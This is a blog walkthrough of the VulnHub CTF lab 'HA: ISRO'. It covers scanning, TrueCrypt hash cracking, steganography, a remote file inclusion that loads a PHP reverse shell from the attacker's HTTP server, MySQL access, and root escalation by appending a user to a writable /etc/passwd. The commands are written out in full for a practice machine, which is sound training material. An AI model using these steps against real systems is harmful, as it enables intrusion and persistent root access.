<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">HA: ISRO Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-isro-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-10-19T17:32:06+00:00">October 19, 2019</time><time class="updated" datetime="2025-06-10T20:11:02+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve our CTF challenge called “HA: ISRO” We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.</span></p>
<p><span style="color: #000000;">Download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/ha-isro,376/">Here</a></strong></span></span></p>
<p><span style="color: #000000;">Level: Intermediate</span></p>
<p><span style="color: #000000;">Task: Find 4 Flags on the victim’s machine.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Scanning Network</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Performing Directory Bruteforce</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">RFI</span></li>
<li><span style="color: #000000;">Create PHP reverse shell</span></li>
<li><span style="color: #000000;">Getting a reverse connection via RFI</span></li>
<li><span style="color: #000000;">Spawning a TTY Shell</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Writable /etc/passwd File</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Scanning Network</strong></span></h3>
<p><span style="color: #000000;">First of all we try to identify our target and for this use the following command:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-LmnUilije5Y/XatDNtM0eOI/AAAAAAAAhCo/VMuwiwUPCMw7X0QLHUsQP7K6d3WtDedagCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">Now that we have identified our target using the above command, we can continue on to our second step that is scanning the target. We will use nmap to scan the target with the following command:</span></p>
<pre class="lang:default decode:true ">nmap -A 192.168.1.104</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Dvgnb0etrQY/XatDQ_5eB-I/AAAAAAAAhDM/t8b_DwVUxlU4GZngOVN1C4AIKwOsJgReQCLcBGAsYHQ/s1600/2.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">With the help of help scan, we now know that port number 22, 80 are open with the service of SSH, HTTP respectively. Now that port 80 is open we open the target IP address in our browser as shown in the following image:</span></p>
<pre class="lang:default decode:true">http://192.168.1.104</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-dLbN5MDXj0k/XatDTypBhNI/AAAAAAAAhDo/IF5GFCW6H7IAxZx21bpEIACV2OtcIwxzgCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">It opened a webpage as shown in the above image. Here we found the Bhaskara page, so now we opened and found an information webpage there as shown in the image below:</span></p>
<pre class="lang:default decode:true">http://192.168.1.104/bhaskara.html</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-CiMx9taAfZI/XatDTVTIvmI/AAAAAAAAhDk/JlFqXP_JSMsvoe92kancqNFlS9vBD3UfACLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">As a convention, we will enumerate the webpage by going through the source code. We see that we have the Bhaskara Launch Code. This seems a base64 encoded text.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JR5VJmJVBHU/XatDUEKQu8I/AAAAAAAAhDs/tEYiZVUoIHsYCPt0RspLwHIk6LDGEyS-gCLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">Now we got to decode it. To do this we will be using the combination of the echo command and the base64 -d.</span></p>
<pre class="lang:default decode:true">echo "L2JoYXNrYXJh" 1 base64 -d</pre>
<p><span style="color: #000000;">After decoding the base64 encoded text we get “/bhaskara”. This seems a hint that there might be a directory named bhaskara.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-F-aDgzcbwD4/XatDUIhAF7I/AAAAAAAAhDw/XNWYU0dPgJIe9EKCMlixO3dqiJV8AlTZQCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">So, we went on to our browser in order to browse the bhaskara directory. We see that a file is downloaded when we browse the URL. This is a 2MB file. After enumerating the file, we came to realize that it is a TrueCrypt file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0oqPJwNvFdw/XatDUXEHciI/AAAAAAAAhD0/ZPU6R5orHakOpWOroMk1-Oenj436g0q3gCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">Now in order to crack this file, we are going to use extract its hash using the true.py. You can download the true.py from this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/truecrypt2john.py">link</a></strong></span>. We named the file as true.py and ran it and it gave us the password as xavier.</span></p>
<pre class="lang:default decode:true">python true.py bhaskara &gt; hashes
john hashes --show</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hfRg4opO92E/XatDUxq-7kI/AAAAAAAAhD4/dmqCOlpiscoCOGMFqpDsLc8NZwUBSf9tQCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">Now as we knew it was a TrueCrypt file. That means it might be hiding something inside it. So, we tried to open it using VeraCrypt by providing it path and selecting a volume as shown in the given image. </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TSWzb3qm2Is/XatDVKqD0CI/AAAAAAAAhD8/nDohPcS5_l8Tv3oj0owfloZAAligpl56gCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">Upon mounting the TrueCrypt file on a slot, we are asked to enter the password. We enter the password that we found earlier i.e. ‘xavier’ </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Bzbdv_Yx28E/XatDNiQvMaI/AAAAAAAAhCs/EB8cXjo2SX44HgysujbxC18orD2VlLicQCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;"> It opened up to show a text file labelled ‘flag.txt’. We opened it; it gave us our first flag. Bhaskara Flag.</span></p>
<p><span style="color: #000000;"><strong>Bhaskara Flag: {b7bb88578a70970b9be45ac8630b6f9d}</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ourP80vNP20/XatDNh46YnI/AAAAAAAAhCk/lDfoTYLVssMffrNwr4LrFoK3WJ4IMxGPACLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">Now let’s move forward in Enumeration. We also performed a directory scan. This gave us an /img directory. We performed an extension directory scan. It gave us a connect.php.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.104
dirb http://192.168.1.104 -X .php</pre>
<p><span style="color: #000000;">We went into the /img directory. Here we found an image called aryabhata.jpg.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JBTdZkfn1mU/XatDOk201GI/AAAAAAAAhC0/Cs4N4t1gmVAnxMlTXrPwOYjqDqTXdHA7QCLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">We will download the aryabhata.jpg and opened it.  </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-h2-zzhdVS7M/XatDOrjR1iI/AAAAAAAAhCw/QHYpTO0UdpAJDnMsR_YEy4k1ZBhtjwv7ACLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">Upon opening it we found it to be the poster for Aryabhata satellite as shown in the image given below.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1ShZF1LXg_c/XatDP1Np10I/AAAAAAAAhDA/fdaVKgwZ3pAdlQxQiz8_INnhwiYlBfGZACLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">As we couldn’t find anything specific with the image, we suspected that there is some steganography involved. Hence, we decided to use the Steghide tool to extract anything that might be hidden in the image. We saw that there is a text file named flag.txt hidden inside it. On opening it we found the Aryabhata flag. </span></p>
<pre class="lang:default decode:true">steghide extract -sf aryabhata.jpg
cat flag.txt</pre>
<p><span style="color: #000000;"><strong>Aryabhata Flag:{e39cf1cbb00f09141259768b6d4c63fb}</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-aw1K3LQKHng/XatDPiN_LCI/AAAAAAAAhC4/LpOaqKIiX8cjzD6FJ_d5h886tfDeNMr3QCLcBGAsYHQ/s1600/15.png"/></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Back to the Web Browser, we also found a connect.php in our drib directory bruteforce. This gave us nothing. Then we realized that this can be command injection. Now to test we tried opening the etc/passwd file through it. As seen in the image given below, we see that it’s a File Inclusion Vulnerability.</span></p>
<pre class="lang:default decode:true">192.168.1.104/connect.php?file=/etc/passwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rn8kNrrCMYs/XatDPyFIbfI/AAAAAAAAhC8/MWIEeet_WS0NFM8Sq8Yo5PjEscPrCCQogCLcBGAsYHQ/s1600/16.png"/></p>
<p><span style="color: #000000;">We edited our shell.php, to enter the attacker machine IP address. And then closed the file after saving it. Now we need to send this to the target machine. Hence, we started a python http server using the one-liner showed below.</span></p>
<pre class="lang:default decode:true">nano shell.php
python -m SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ivO_XM0XXuU/XatDQq34CTI/AAAAAAAAhDE/WCff6o9QMNIWwEmxH1odXHrqRPwM9LNwACLcBGAsYHQ/s1600/17.png"/></p>
<p><span style="color: #000000;">We are gonna capture a reverse connection using the netcat. So we need to initiate a listener on the port mentioned in the shell file.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;">After starting the listener on the target machine, we will run the shell on the target machine using the File Inclusion Vulnerability.</span></p>
<pre class="lang:default decode:true">192.168.1.104/connect.php?file=http://192.168.1.103:8000/shell.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4cto9TGIvZE/XatDQm52N6I/AAAAAAAAhDI/zUOsGalsAQ8xRcWLaIOI5YM1W3DOp-IVwCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Upon execution, the shell gave us a session to the target machine. As seen in the image given below, it wasn’t a proper shell. So, we needed a python one liner to convert it into a proper shell.</span></p>
<pre class="lang:default decode:true">python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">We used netstat command to check for the IP address and ports the target machine is listening on and found that a web service (3306) is allowed for localhost only. The most common service to run on the port 3306 is MySQL. Let’s enumerate in that direction.</span></p>
<pre class="lang:default decode:true">netstat -antp</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mPrcYjn9GL4/XatDR0fPdMI/AAAAAAAAhDQ/osGjIiqt7sscYH3j4C9Z8fDFYBhxiBCTwCLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">We tried to login in the MySQL database as the root user. After logging in the MySQL, we enumerated the databases. Here we found a database named ‘flag’. We looked inside the tables of flag database. Here we found our second flag Mangalyaan Flag.</span></p>
<pre class="lang:default decode:true">mysql -u root 
show databases;
use flag;
show tables;
select * from flag;</pre>
<p><span style="color: #000000;"><strong>Mangalyaan Flag:{d8a7f803e36f1c84e277009bf2c0f435}</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-2SuRmdqTjqM/XatDR7Q-YII/AAAAAAAAhDY/IWXeD8mBgoEE1FGiA1duV6N5dDV2hvwuwCLcBGAsYHQ/s1600/21.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">As a part of our Enumeration for Escalating Privilege on the target machine, we try to find if the /etc/passwd is writable. We can see that the file is, in fact, writable. This is our way to move forward.</span></p>
<pre class="lang:default decode:true">ls -la /etc/passwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IzLYFzF1JrI/XatDSPFnnHI/AAAAAAAAhDU/fNfIGGMwcQEo4mtsuuHVqbnBJF9VNsnhwCLcBGAsYHQ/s1600/22.png"/></p>
<p><span style="color: #000000;">Now we going to need the password hash for the user that we are going to create on the target machine by making an entry in the /etc/passwd file. We are going to use the openssl to generate a salted hash.</span></p>
<pre class="lang:default decode:true">openssl passwd -1 -salt user3 pass123</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zJhJG7J5IM4/XatDSc-5aXI/AAAAAAAAhDc/GXy70z7fuvEknaShNH-MTJM8Eux2LxQAgCLcBGAsYHQ/s1600/23.png"/></p>
<p><span style="color: #000000;">Now back to our remote shell on the target machine. Here we are going to use the hash that we generated in the previous step and make a user raj which has the elevated privilege. We used the echo command to make an entry in the /etc/passwd file. After making an entry we checked the entry using the tail command. Now, all we got to do is run su command with the user name we just created and enter the password and we have the root shell. We traversed inside the root directory to find our final flag, Chandrayaan Flag.</span></p>
<pre class="lang:default decode:true">echo 'raj:$1$user3$rAGRVf5p2jYTqtq0W5cPu/:0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
tail /etc/passwd
su raj
Password: pass123
cd /root
ls
cat final.txt</pre>
<p><span style="color: #000000;"><strong>Chandrayaan Flag:{0ad8d59efe7ce5c820aa7350a5d708b2} </strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-AcDhf80elEE/XatDS0JhALI/AAAAAAAAhDg/VgH45BZI_EYnudhiu15_5Vda16MBmKBlACLcBGAsYHQ/s1600/24.png"/></p>
<p><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
